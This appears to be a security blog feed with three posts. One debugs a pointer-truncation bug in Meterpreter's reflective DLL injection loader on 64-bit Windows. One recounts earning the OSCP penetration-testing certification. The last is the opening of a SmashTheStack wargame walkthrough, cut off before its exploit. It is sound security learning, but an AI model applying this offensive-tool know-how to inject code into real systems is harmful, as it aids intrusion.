<p>The nature of the reflective loading mechanism implied to me that the addresses of <code>pReflectiveLoader</code> and <code>pDllMain</code> should actually be quite close together in memory. However, focussing on a small part of the output, I noticed the following:</p>

<pre><code>[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
[LOADLIBRARYR] Calling pDllMain          (0000000033449BEC)
</code></pre>

<p>Those two pointers were nowhere near each other! The more perceptive of you will have noticed that the <code>pDllMain</code> pointer appeared to have lost its higher-order <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a>. The pointer had in fact been truncated!</p>

<p>But why? It wasn&rsquo;t immediately obvious to me what the reason was, but I was keen to validate that this was the case. To prove my theory, I hacked the code a little so that the higher-order DWORD of the <code>pReflectiveLoader</code> value was used as the higher-order DWORD of <code>pDllMain</code> as well. The hack looked something like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">ULONG_PTR</span> <span class="n">ulReflectiveLoaderBase</span> <span class="o">=</span> <span class="p">((</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">pReflectiveLoader</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(((</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="mh">0xFFFFFFFF</span><span class="p">));</span>
</span><span class='line'><span class="n">pDllMain</span> <span class="o">=</span> <span class="p">(</span><span class="n">DLLMAIN</span><span class="p">)(</span><span class="n">pReflectiveLoader</span><span class="p">()</span> <span class="o">|</span> <span class="n">ulReflectiveLoaderBase</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>After the above code, <code>pDllMain</code> would have the same higher-order DWORD value as <code>pReflectiveLoader</code>. I compiled, deployed, executed &hellip;</p>

<p>&hellip; and it worked!</p>

<h2>Resolution</h2>

<p>Armed with the knowledge earned from the above diagnosis, I set about looking through the code to see why this pointer was being truncated. Clearly the value was perfectly fine prior to being returned from <code>ReflectiveLoader()</code>, so why was it truncated upon return?</p>

<p>I spent quite a bit of time looking around, and I didn&rsquo;t find anything. Nothing was leaping out at me. I felt really stupid. So instead of beating about the bush, I contacted the man himself, the author and creator of Reflective DLL Injection himself, Mr <a href="http://twitter.com/stephenfewer">Stephen Fewer</a>. I explained the situation to him, detailed my findings and asked if he any idea as to why this problem might be occurring.</p>

<p>It didn&rsquo;t take long to get a response. Stephen jumped on the issue straight away, fixed it and submitted a <a href="https://github.com/rapid7/meterpreter/pull/14">pull request</a> to the Meterpreter repository before emailing me back with details of the solution. Talk about great service!</p>

<p>When I saw the solution I immediately felt stupid for missing it myself. In hindsight I should have known to look in this location. I ate some humble pie and savoured the taste while expressing my gratitude to Stephen for his prompt response.</p>

<p>So what was it?</p>

<p>The <code>pReflectiveLoader</code> pointer is a function pointer of a type defined like so:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">REFLECTIVELOADER</span><span class="p">)(</span> <span class="n">VOID</span> <span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>However, the <code>ReflectiveLoader()</code> function was defined in the source like so:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</span>
</span><span class='line'><span class="n">DLLEXPORT</span> <span class="n">ULONG_PTR</span> <span class="n">WINAPI</span> <span class="n">ReflectiveLoader</span><span class="p">(</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span> <span class="p">)</span>
</span><span class='line'><span class="cp">#else</span>
</span><span class='line'><span class="n">DLLEXPORT</span> <span class="n">ULONG_PTR</span> <span class="n">WINAPI</span> <span class="n">ReflectiveLoader</span><span class="p">(</span> <span class="n">VOID</span> <span class="p">)</span>
</span><span class='line'><span class="cp">#endif</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="c1">// ... snip ...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So the function returns a <a href="http://msdn.microsoft.com/en-us/library/cc230394.aspx" title="ULONG_PTR">ULONG_PTR</a> (which is 64-bits) but the function pointer type returned a <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a> (which is 32-bits). This is what was causing the truncation of the pointer and effectively zeroing out the higher-order DWORD of <code>pDllMain</code>. The fix was to simply change the return type of the function pointer to match:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="n">ULONG_PTR</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">REFLECTIVELOADER</span><span class="p">)(</span> <span class="n">VOID</span> <span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Problem solved.</p>

<h2>Extra Thoughts and Conclusion</h2>

<p>For those of you who are wondering, like I was, why this was an intermittent problem the answer lies in the fact that the new versions of Windows have newer versions of <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization" title="Adress Space Layout Randomisation">ASLR</a>. To quote Stephen:</p>

<blockquote><p>The bug was triggering on Server 2012 but not other 64bit systems
probably due to high entropy ASLR making allocations over the 4gig boundary.</p></blockquote>

<p>Earlier versions of Windows didn&rsquo;t have an ASLR implementation that resulted in memory allocations over the 4GB boundary. As a result, the higher-order DWORD was always zero anyway, which meant that the truncation had no impact.</p>

<p>This was a really fun bug to analyse and track down. I&rsquo;m glad we got to the bottom of it. Again I&rsquo;d like to thank Stephen for his involvement in locating the source of the problem.</p>

<p>The new and improved version of Meterpreter that contains this fix will be landing in Metasploit very soon (I hope). Thanks for reading. Comments and feedback are welcomed.  <a name="Edit15thSep"></a></p>

<h2>Edit 15th September</h2>

<p>Today on Twitter <a href="https://twitter.com/KronicDeth" title="Luke Imhoff @ Twitter">Luke Imhoff</a> asked me a good question:</p>

<blockquote class="twitter-tweet"><p><a href="https://twitter.com/TheColonial">@TheColonial</a> why didn&#39;t the compiler issue a truncation warning?</p>&mdash; Luke Imhoff (@KronicDeth) <a href="https://twitter.com/KronicDeth/statuses/378878334249095168">September 14, 2013</a></blockquote>


<script async src="http://buffered.io//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>I answered quickly but realised after that I was a bit hasty, so I&rsquo;m going to clarify on here instead.</p>

<p>We need to review a few snippets of code to understand why the compiler didn&rsquo;t complain. Firstly, the function-pointer type definition (prior to the fix):</p>

<figure class='code'><figcaption><span>ReflectiveDllInjection.h (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">REFLECTIVELOADER</span><span class="p">)(</span> <span class="n">VOID</span> <span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Second, the declaration of the <code>ReflectiveLoader()</code> function:</p>

<figure class='code'><figcaption><span>ReflectiveLoader.c (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</span>
</span><span class='line'><span class="n">DLLEXPORT</span> <span class="n">ULONG_PTR</span> <span class="n">WINAPI</span> <span class="n">ReflectiveLoader</span><span class="p">(</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span> <span class="p">)</span>
</span><span class='line'><span class="cp">#else</span>
</span><span class='line'><span class="n">DLLEXPORT</span> <span class="n">ULONG_PTR</span> <span class="n">WINAPI</span> <span class="n">ReflectiveLoader</span><span class="p">(</span> <span class="n">VOID</span> <span class="p">)</span>
</span><span class='line'><span class="cp">#endif</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>   <span class="c1">// ... snip ...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Third, the declaration of both <code>pDllMain</code> and <code>pReflectiveLoader</code>:</p>

<figure class='code'><figcaption><span>LoadLibraryR.c (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">REFLECTIVELOADER</span> <span class="n">pReflectiveLoader</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'><span class="n">DLLMAIN</span> <span class="n">pDllMain</span>                   <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, the actual calls that use these pointers:</p>

<figure class='code'><figcaption><span>LoadLibraryR.c (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pReflectiveLoader</span> <span class="o">=</span> <span class="p">(</span><span class="n">REFLECTIVELOADER</span><span class="p">)((</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">lpBuffer</span> <span class="o">+</span> <span class="n">dwReflectiveLoaderOffset</span><span class="p">);</span>
</span><span class='line'><span class="c1">// ... snip ...</span>
</span><span class='line'><span class="n">pDllMain</span> <span class="o">=</span> <span class="p">(</span><span class="n">DLLMAIN</span><span class="p">)</span><span class="n">pReflectiveLoader</span><span class="p">();</span>
</span></code></pre></td></tr></table></div></figure>


<p>As we can see, <code>pReflectiveLoader</code> is set via a cast from a <code>UINT_PTR</code> type, which maps to the right sized pointer for whatever platform it&rsquo;s compiled on. Casting a <code>UINT_PTR</code> to a <code>REFLECTIVELOADER</code> type doesn&rsquo;t change the size.</p>

<p>At first I though the reason there was no compiler warning was because the result of calling <code>pReflectiveLoader</code> was cast to a <code>DLLMAIN</code> type, effectively hiding the problem, but that&rsquo;s not correct. If <code>pDllMain</code> was just a <code>ULONG_PTR</code> instead of <code>DLLMAIN</code> and no casting was used it still wouldn&rsquo;t have resulted in a problem because the return type of <code>REFLECTIVELOADER</code> is <em>smaller</em>, and hence an implicit cast would have turned this into a 64-bit value without complaining. The truncation has already happened because of the incorrect return type of <code>REFLECTIVELOADER</code>.</p>

<p>Ultimately the problem is down to the disconnect between the function pointer type and the function implementation type.</p>

<p>Thanks for the great question Luke.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OSCP and Me]]></title>
    <link href="http://buffered.io/posts/oscp-and-me/"/>
    <updated>2013-08-16T20:33:00+10:00</updated>
    <id>http://buffered.io/posts/oscp-and-me</id>
    <content type="html"><![CDATA[<p>The <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/" title="Penetration Testing with BackTrack">PWB</a> course by <a href="http://www.offensive-security.com/" title="Offensive Security">Offensive Security</a> is absolutely awesome, as is the exam which earns you the prized <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a> certification. I took this course and exam recently; I loved it and I nailed it! I am now equipped with a much better understanding of the security world and am in a better position to help businesses improve the security of their application architecture and infrastructure.</p>

<p><a href="http://buffered.io/contact" title="Contact OJ">Hit me up</a> and let&rsquo;s talk about how I can help you make your applications more secure.</p>

<p>What follows is the full story of my path through PWB and OSCP. Enjoy.</p>

<!--more-->


<h2>The Long Version</h2>

<p>I started developing software professionally back in 1999, just shy of 15 years ago. Since then I&rsquo;ve been fortunate enough to work in some pretty amazing domains, used a massive variety of technologies and have played a part in some <a href="http://burnoutrevenge.ea.com/360/player.asp?language=en" title="Burnout Revenge for Xbox 360">pretty</a> <a href="https://internetbanking.suncorpbank.com.au/" title="Suncorp Internet Banking">awesome</a> <a href="http://www.innovation.gov.au/Industry/Defence/CapabilityDirectories/Documents/JSFCapabilityDirectory/company%20profiles/ball_solutions/profile_3.html" title="Mission Data Planning Environment">software</a>. I&rsquo;m proud of what I&rsquo;ve achieved so far. However I&rsquo;ve recently found myself looking for a new challenge. Something that will make me think, push me to learn new things, and hopefully keep my motivation levels up to a high level. Ultimately, I wanted to have a bit of a career change without really changing my career.</p>

<p>Towards the end of last year, after some careful deliberation, I decided to follow a long-term passion of mine with a goal of incorporating it into my work. That passion is <a href="http://en.wikipedia.org/wiki/Information_security" title="Information Security">Information Security</a>. Infosec as a domain is made up of a <em>lot</em> of different areas, and hence making it a point of focus means that anyone looking to get involved needs to first learn the basics of a broad set of topics and then, perhaps, <em>specialise</em> in one of them.</p>

<p>For many years I&rsquo;ve <a href="http://buffered.io/categories/rce/" title="Category: RCE">dabbled with reverse engineering</a>, kept up-to-date with various security topics, and have been quite a <a href="http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies/" title="XSS Flaws via MVC Model Binding and Request.QueryString Inconsistencies">security-minded developer</a>. I didn&rsquo;t want to just go and read up on the things that I already knew, but instead I wanted to throw myself in the deep end into an area that I wasn&rsquo;t too familiar with but had a keen interest in.</p>

<p>This led me to <a href="http://en.wikipedia.org/wiki/Penetration_test" title="Penetration Test">penetration testing</a> and ultimately to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a>.</p>

<h2>Exploring OSCP</h2>

<p>I spent quite a bit of time searching for courses and material that would get me going with the basics of penetration testing servers and web applications. There&rsquo;s quite a lot out there, though much of it is rudimentary, is disjoint or lacks cohesion, or talks about &ldquo;point and shoot&rdquo; exploitation. While this might be helpful in becoming a <a href="http://en.wikipedia.org/wiki/Script_kiddie" title="Script Kiddie">script kiddie</a> it wasn&rsquo;t what I was looking for. I wanted to be challenged.</p>

<p>When I stumbled on <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a> I was initially dubious as I am when it comes to any certification. Most developers out there are probably experienced with the certifications that exist in the world of software engineering and how they do not provide an indication of a person&rsquo;s ability. Before knowing better I assumed this would be the same.</p>

<p>However, after <a href="http://proactivedefender.blogspot.com/2012/01/oscp-my-review.html">reading</a> <a href="http://www.hackyeah.com/2010/12/brief-review-of-the-pwb-class-and-the-oscp-certification/">some</a> <a href="http://blog.nullmode.com/2013/05/penetration-testing-with-backtrack-oscp.html">reviews</a> from people who have achieved the certification, I started to realise that this is exactly the kind of thing I was looking for.</p>

<p>Quotes from these reviews include lines such as:</p>

<blockquote><p>The truism &ldquo;anything worth having doesn&rsquo;t come easy&rdquo; is one I have often remembered when on a particularly difficult path to a goal. Never have the words rung quite so true when applied to my quest for [the] OSCP certification.</p></blockquote>

<p>Others state:</p>

<blockquote><p>The OSCP certification, in my opinion, proves that it&rsquo;s holder is able to identify vulnerabilities, create and modify exploit code, exploit hosts, and successfully preform tasks on the compromised systems over various operating systems.</p></blockquote>

<p>I was becoming convinced that OSCP was something that I had to do, despite not ever doing any form of penetration testing in the past (other than fumbling around my own web applications). At this point I reached out to a local security professional, <a href="http://security.crudtastic.com/" title="Security with added Cheese">Ash D</a> who is a seasoned Infosec guru, SANS mentor/teacher and who has passed the exam himself, and bribed him with a free lunch to come and talk to me about his experience. He turned out to be friendly, fun, informative and gave me just the confirmation I was looking for. Even if I failed miserably I&rsquo;d already made a good friend out of the experience (a friend who later would keep encouraging me right through to the end <a href="http://security.crudtastic.com/?p=699">and beyond</a>, thanks Ash).</p>

<p>OSCP requires you to spend a lot of time in a virtual lab practising the various techniques that you&rsquo;ll need to master to do well in the exam. While the learning material from Offensive Security is good (more on this later), the lab is what makes the whole thing <strong>great</strong>. This was the last key point for me. I wasn&rsquo;t just going to learn theory, I would actually learn to <em>do</em> things and have to <em>demonstrate</em> that in the exam to gain the certification.</p>

<h2>Getting Started</h2>

<p>It was early 2013 and I was working some longer hours for various clients which made it hard for me to find the time to put into some basic preparation. As a result it took me quite a while to sign up for the course as I wanted to make sure that I would be able to give it the time it deserves.</p>

<p>As April 2013 approached I came to the realisation that it was <em>never</em> a good time to sign up for something like this and hence I should just go and make it happen. I spoke to my wife and kids about it and made sure they were OK with the idea of me being locked away to learn, and they gave me their full support (short interlude: my family is awesome).</p>

<p>I jumped on the web and went to the <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/" title="PWB sign up">sign-up</a> page and was presented with quite a few options. I needed to specify how much lab time I wanted prior to my exam. This was a bit like telling a mobile phone carrier how many calls you&rsquo;re going to make; I really wasn&rsquo;t sure! Instead of deliberating for too long, I decided to go with the 30-day option and extend my time if I felt that I needed more. No big deal.</p>

<p>I signed up for the course, and locked in the date of June 16th to kick off my time in the labs.I was really excited, and couldn&rsquo;t wait for it to start. In the following days I was contacted by Offsec and asked for proof of identity. Offsec require that you don&rsquo;t use a &ldquo;free&rdquo; email address such as Gmail when signing up, however I don&rsquo;t have any email addresses that aren&rsquo;t Google Apps hosted (this will change soon) and hence I needed to verify my identity with them. This goes to show that they don&rsquo;t just let any unknown person take up the course to learn things which can easily be misused.</p>

<p>After what felt like an eternity, June 16th came around and my connection pack arrived in my inbox. Unfortunately for me, work and a few other things took over and I lost the first week of time. I was able to connect to the labs on the odd occasion but for very short periods of time. Given that I wasn&rsquo;t yet across the material that time I spent in the labs wasn&rsquo;t really fruitful.</p>

<p>At day 8 things finally settled down to a level where I was able to dive into the material and begin fumbling my way through the lab. This is where things really started to become entertaining.</p>

<h2>Initial Lab Time</h2>

<p>My first few days in the lab were interesting. I popped the SYSTEM account on one of the Windows boxes in the first 4 hours of my lab time. This was not only surprising but it gave me a confidence boost which didn&rsquo;t do me any favours. From there I failed repeatedly to compromise another machine. The second day yielded no results. The third day was also fruitless. By the end of the fourth day, when I still had just <em>one</em> machine on my tally, I was beginning to ask myself questions. Am I cut out for this? Have I bitten off more than I can chew?</p>

<p>I stepped back for a while and pondered my approach. I realised that I wasn&rsquo;t thinking and looking to learn. I wasn&rsquo;t approaching the problems like a hacker would. I wasn&rsquo;t doing enumeration properly. I was investing too much time looking for out-of-the-box exploits rather than trying to connect the dots myself. I gave myself a slap, and started again.</p>

<p>This is when things started to change. Machines started to fall. I started to learn more. I improved in all the areas I was failing at before. It was wonderful.</p>

<p>On the fifth day I managed to pop 7 machines. What a difference!</p>

<h2>Proper Lab Time</h2>

<p><em>Note: my coverage of the lab from here is &ldquo;point in time&rdquo;. Offsec change and upgrade the lab all the time, and hence details of the lab and what you&rsquo;ll experience will change over time too.</em></p>

<p>The lab was a wonderful place to play, practice and learn. I was constantly blown away by the mixture of operating systems, patch levels, kernel versions, system application and feature versions, third-party applications, and even custom applications that had been built which emulated the kind of things you&rsquo;d expect a developer to throw together to help them do something a little easier and quicker as part of their day job. The effort that has gone into the design and set up of the lab environment is commendable. It really felt like I was in a real network with real machines and real people using those machines.</p>

<p>It was made up of approximately 60 machines partitioned into a number of networks. Each machine has it&rsquo;s own identity and story, some are interesting and some not so much. I&rsquo;m not going to elaborate on the detail too much because discovering that is all part of the fun. But I will say that I experienced <code>Pain</code> and <code>Sufference</code> [sic] in ways I didn&rsquo;t expect.</p>

<p>The networks are connected together in interesting ways, and you as the penetration tester will need to work your way through the machines and networks, pivoting your attacks off compromised hosts as you go with the end goal of compromising all of the hosts and making it to the <strong>Admin</strong> network.</p>

<p>As you would expect, some machines are very easy to break into and other machines are really quite hard. The beauty of the lab is that, depending on your background, exposure and interests, the machines that you find hard might not be hard for others and vice-versa. Some machines run applications you wouldn&rsquo;t expect them to run. Some machines have very new or very old configurations of software. The mix is truly great; it keeps you thinking rather than giving you the luxury of slipping into a &ldquo;routine&rdquo;.</p>

<p>The lab exposes you to a very large range of exploitations; too many to mention here. Chances are that if a type of exploit exists that you need to abuse, you&rsquo;ll get the chance to use it in the lab.</p>

<p>At this point I think it&rsquo;s important to point out that in OSCP the focus is on knowing how to apply existing public exploits and known approaches to manual exploitation of vulnerabilities. While there is room for you to construct your own exploits if you choose to, there is another course offered by Offsec which covers that in more detail, and that&rsquo;s <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert">OSCE</a>.</p>

<p>It took me a little bit of time before I realised that exploitation wasn&rsquo;t the only thing that I needed to do while in the lab. <em>Post-exploitation</em> was very important. Looting the machines that I&rsquo;d compromised was something that I didn&rsquo;t consider doing in the early days, and I suffered as a result. When I came to realise that the keys to some of the machines were located on others, I had to go back through my list of popped hosts and loot them properly. If you&rsquo;re going to do this course, make sure you do a good job of post-exploitation!</p>

<p>While doing the lab, you are supposed to keep track of all the work you&rsquo;ve done as you need to provide a deliverable at the end of it: a full penetration test document. This document has to contain the detail of what you did and how you did it. My advice is to not put this off until the end, but instead work on it as you go. This includes screenshots, dumps of console output, source code to exploits you&rsquo;ve written and scripts you&rsquo;ve used to automate tasks.</p>

<p>Even though I was pretty good at taking notes, I had kept them all in markdown in a private <a href="http://git-scm.org/" title="Git">git</a> repository instead of putting them in a well-structured document. As a result, I had to do this after my exam, which made the experience more painful than it needed to be.</p>

<h2>Post-Lab</h2>

<p>By then time your lab time has ended, you <em>should</em> have managed to compromise/pop/pwn a large percentage of the networks, if not 100%. In my case, I ran out of time and I missed about 8 machines in total. While I was disappointed with the result, a discussion with various OSCP alumni led me to realise that I had managed to defeat the harder machines in the labs and hence the rest of them would be quite simple. I decided not to extend my lab time as spending extra money for the sake of a few more machines didn&rsquo;t make sense. Instead, I booked in my exam for August 6th and used the lead-up time for practice, refining my documentation, and preparing my scripts and cheat sheets for the big day.</p>

<p>There are some great resources out there for practising this kind of thing, but the main one that I want to point out is <a href="http://vulnhub.com/" title="Vulnhub">Vulnhub</a> (a pet project of <a href="http://blog.g0tmi1k.com/" title="g0tmi1k's blog">g0tmi1k</a>). That site contains downloadable <em>boot2root</em> images that you can use to practice on with the added benefit of it all being legal.</p>

<p>I really focused on the areas that I felt I was weakest, with the main one being Linux privilege escalation. There&rsquo;s a bit of material out there on it, and there&rsquo;s also g0tmi1lk&rsquo;s fantastic <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html" title="Basic Linux Privilege Escalation">cheat sheet</a>, but I still failed to connect some of the dots during my travels. It&rsquo;s about now I must give a bit hat-tip to <a href="https://twitter.com/pipesec" title="Pipes on Twitter">Pipes</a> and <a href="https://twitter.com/metlstorm" title="Metlstorm on Twitter">Metlstorm</a>, both of <a href="http://www.insomniasec.com/" title="Insomnia Security">Insomnia Security</a>, for being two awesome mentors and providing me with fantastic insights on ways to get root. Those guys are awesome.</p>

<h2>The Exam</h2>

<p>The OSCP exam is a 24-hour &ldquo;loser takes all&rdquo; style exam. You are given access to a custom network, just like you are in the labs, and you have a number of machines assigned to you. The exam pack contains information on the machines, along with various rules that you must adhere to when attacking them. Each machine is worth a number of points and you earn those points if you:</p>

<ul>
<li>Compromise the host.</li>
<li>Document your findings well enough with clear instructions on how it was done. This document should also contain the  &ldquo;flags&rdquo;; text files with what appears to be random characters in them which prove that you did what you did.</li>
<li>Don&rsquo;t break the rules.</li>
</ul>


<p>Points are allocated to you even if you don&rsquo;t managed to get SYSTEM/root on the machine. All is not lost if you can&rsquo;t do privilege escalation! However you <em>can not</em> break the rules. In my exam, for example, there was at least one machine which wasn&rsquo;t allowed to be attacked at all using <a href="http://metasploit.org/" title="Metasploit">MSF</a>. Breaking this rule would have meant 0 points for that machine.</p>

<p>I started my exam at 8am just as the family were leaving the house (taking son #1 to school). I was buzzing. I couldn&rsquo;t sit still I was that excited. I realised how much I had missed my time in the labs and the thought of having another crack was making me twitchy.</p>

<p>By 8:45am I had popped root on my first machine.</p>

<p>By 10:00am the second had fallen. I was on a roll! I was riding high and felt really good.</p>

<p>The third machine proved to be a little more difficult, but it fell just before 1:00pm.</p>

<p>The last two machines, making a total of five, were quite a bit trickier. I&rsquo;d say that the fourth was by far the hardest, but I loved it as it was yet another example of where I learned something new while doing something in an Offsec lab. I w00ted like a teenager when it fell and did a victory lap around the house.</p>

<p>By 10pm I was done with all 5 machines. My notes were in the typical markdown/git repository structure but were quite thorough and had captured everything I had done in quite a lot of detail. With the exam out of the way, and 100 points in the bag, I went to bed.</p>

<p>The following day I had the arguably arduous task of writing my exam document, which was supposed to be included with your lab report. All in all my document totalled 220 pages by the time it was done and I was glad to see the back of it! It was submitted late on Wednesday evening but with plenty of time to spare before the 8am Thursday cut-off.</p>

<p>I was done. I was relieved, excited and sad that it was all over.</p>

<h2>Confirmation</h2>

<p>While I was pretty sure that I&rsquo;d done a good enough job to get my certification, there is always some doubt that you might have missed something or done something silly. So until I received confirmation from Offsec I wasn&rsquo;t sure if I had passed.</p>

<p>It took less than 48 hours for me to receive the email:</p>

<blockquote><p>Dear Oliver,</p>

<p>We are happy to inform you that you have successfully completed the Penetration Testing with BackTrack certification challenge and have obtained your Offensive Security Certified Professional (OSCP) certification.</p>

<p>You will receive the certification by mail within 80 days.</p></blockquote>

<p>I was elated. What a journey! I really felt like I had achieved something. I truly felt, and still feel, that I&rsquo;d be able to do a great job performing a penetration test for a client.</p>

<h2>Summary &amp; Conclusion</h2>

<p>There&rsquo;s no denying it, OSCP was just fantastic. But same parts of it were <em>hard</em>. Not impossibly hard, but hard enough to make you question your own abilities. It broke my ego and then built it up again. I can&rsquo;t recommend it strongly enough!</p>

<p>However if you&rsquo;re new to the security game, this probably isn&rsquo;t the first thing you should attempt to tackle. I think I managed to get through thanks to my polyglot development background, my history with a mixture of operating systems, and my time reverse engineering various binaries. Without those things I would have had a very, <em>very</em> hard time.</p>

<p>I&rsquo;m very happy that I took this challenge on. I feel like I really achieved something and that I have a certification that means a whole more than the paper it&rsquo;s written on. I can&rsquo;t wait to see the official paperwork come through the mail.</p>

<p>So what&rsquo;s next? Certification-wise it has to be <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert">OSCE</a>, but I will give my family a break before I take that on. Work-wise, I will be looking to engage with new and existing clients to determine how best I can help them with the security of their infrastructure and applications in the hope that this becomes a major part of my work longer term.</p>

<p>If you&rsquo;re out there reading this and you are looking for some help in this area, please <a href="http://buffered.io/contact" title="Contact OJ">drop me a line</a>.</p>

<p>Thank you all for reading. Feel free to hit me with any questions and I&rsquo;ll do my best to answer them.</p>

<p><a href="https://twitter.com/TheColonial" title="OJ on Twitter">OJ</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Levels 7 and 7_alt - IO at STS]]></title>
    <link href="http://buffered.io/posts/levels-7-and-7_alt-io-at-sts/"/>
    <updated>2013-08-15T13:51:00+10:00</updated>
    <id>http://buffered.io/posts/levels-7-and-7_alt-io-at-sts</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been documenting my experiences with <a href="http://io.smashthestack.org:84/" title="IO @ Smash The Stack">IO</a> at <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the <code>alt</code> level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven&rsquo;t had a play on the <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> wargames yet, I really do recommend it. They&rsquo;re great fun.</p>

<!--more-->


<h2>Spoiler Alert</h2>

<p>This post covers, in detail, how to get past level 7 and level 7 alt. If you haven&rsquo;t done these levels yourself yet, and you plan to, then please don&rsquo;t read this until you&rsquo;ve nailed them yourself. I&rsquo;d hate for this to ruin your experience.</p>

<p>However, if you&rsquo;ve done the level or you&rsquo;re just interested in what&rsquo;s involved, please read on.</p>

<h2>Connecting</h2>

<p>Fire up a shell and connect to the game server with the password for the <code>level7</code> user (I won&rsquo;t be sharing passwords here).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ssh level7@io.smashthestack.org
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what challenges there are for us:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:~<span class="nv">$ </span>ls /levels/level07*
</span><span class='line'>/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
</span></code></pre></td></tr></table></div></figure>


<p>This level has two possible entry points, and we&rsquo;ll be covering both in this post.</p>

<h2>Level 07</h2>

<p>We start by looking at the source of the target program:</p>

<figure class='code'><figcaption><span>level07.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
